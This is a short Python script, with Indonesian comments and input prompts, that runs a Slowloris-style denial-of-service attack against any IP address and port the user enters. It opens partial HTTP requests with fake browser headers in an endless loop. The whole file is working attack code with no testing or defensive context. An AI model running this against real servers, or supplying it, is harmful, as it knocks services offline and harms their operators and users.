import socket
import random

def slowloris_attack(target, port):
    socket_list = []
    headers = [
        "User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv1.9.2.3) Gecko/20100401 Firefox/3.6.3",
        "Accept-language: en-US,en;q=0.5"
    ]

    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
            for header in headers:
                s.send(f"{header}\r\n".encode('utf-8'))
            return s
        except socket.error:
            return None

    while True:
        s = create_socket()
        if s:
            socket_list.append(s)

if __name__ == "__main__":
    target_ip = input("Masukkan IP target: ")  # Memasukkan IP target
    target_port = int(input("Masukkan port target: "))  # Memasukkan port target

    slowloris_attack(target_ip, target_port)
